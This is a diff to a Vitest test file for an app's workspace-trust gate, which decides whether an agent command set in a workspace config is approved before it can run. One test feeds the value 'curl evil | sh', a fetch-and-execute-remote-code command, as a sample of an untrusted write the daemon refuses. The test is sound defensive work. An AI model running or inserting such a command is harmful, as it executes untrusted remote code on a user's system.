@@ -1,6 +1,7 @@
 import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
 import { get } from "svelte/store";
-import { gavinTrees } from "./gavinState";
+import { gavinTrees, worktreeSetups } from "./gavinState";
+import { executionKeys, executionKeysHash } from "./workspaceTrust";
 import type { LayoutNode } from "./layout";
 import { allSessionIds } from "./layout";
 import type { Page, Workspace } from "./workspace";
@@ -3328,9 +3329,18 @@ function agentProfile(id: string, failurePatterns: string[]) {
   };
 }
 
+/// Seeds the root context's `[agent]` block, and — unless a test says
+/// otherwise — records that the human approved it.
+///
+/// Approved by default because that is what every case here is about:
+/// which command a workspace resolves to, not whether it is allowed to.
+/// Left unapproved, `command` and `file` are inert (`workspaceTrust.ts`)
+/// and the assertions would be reading the gate rather than the
+/// resolution. The gate has its own describe block below.
 function seedAgentConfig(
   workspaceId: string,
-  agent: { profile: string | null; file: string | null; command: string | null }
+  agent: { profile: string | null; file: string | null; command: string | null },
+  approved = true
 ): void {
   gavinTrees.update((t) => ({
     ...t,
@@ -3351,6 +3361,13 @@ function seedAgentConfig(
         },
       ],
     },
+  }));
+  const hash = executionKeysHash(executionKeys(agent, get(worktreeSetups)[workspaceId] ?? []));
+  layoutState.update((st) => ({
+    ...st,
+    workspaces: st.workspaces.map((w) =>
+      w.id === workspaceId ? { ...w, trustedConfigHash: approved ? hash : undefined } : w
+    ),
   }));
 }
 
@@ -3477,10 +3494,39 @@ describe("workspace settings", () => {
     setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
     vi.mocked(backend.setWorkspacesState).mockClear();
 
+    // `mcp_file` rather than `command`: the two execution keys DO touch
+    // config.json, to carry the trust marker (below). The other five
+    // still have no business there.
+    await setAgentField("ws-1", "mcp_file", ".mcp.json");
+
+    expect(backend.setRootConfigField).toHaveBeenCalledWith("/tmp/ws", "mcp_file", ".mcp.json");
+    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
+  });
+
+  it("setAgentField approves the value it just wrote, so gavin's own edits never trip the gate", async () => {
+    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
+
     await setAgentField("ws-1", "command", "claude --model opus");
 
-    expect(backend.setRootConfigField).toHaveBeenCalledWith("/tmp/ws", "command", "claude --model opus");
-    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
+    // The marker for the value that was written, not for the one the
+    // tree still holds: the watcher push carrying it is ~170ms away, and
+    // hashing the old command would approve something nobody asked for.
+    expect(get(layoutState).workspaces[0].trustedConfigHash).toBe(
+      executionKeysHash(executionKeys({ profile: null, file: null, command: "claude --model opus" }, []))
+    );
+    expect(backend.setWorkspacesState).toHaveBeenCalled();
+  });
+
+  it("setAgentField stamps nothing when the daemon refused the write", async () => {
+    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
+    vi.mocked(backend.setRootConfigField).mockRejectedValueOnce(new Error("nope"));
+
+    await setAgentField("ws-1", "command", "curl evil | sh");
+
+    // Otherwise a refused write would leave a marker approving a value
+    // config.toml never took -- and the NEXT thing to land in that key
+    // would arrive pre-approved.
+    expect(get(layoutState).workspaces[0].trustedConfigHash).toBeUndefined();
   });
 
   it("setAgentField does nothing without a root", async () => {
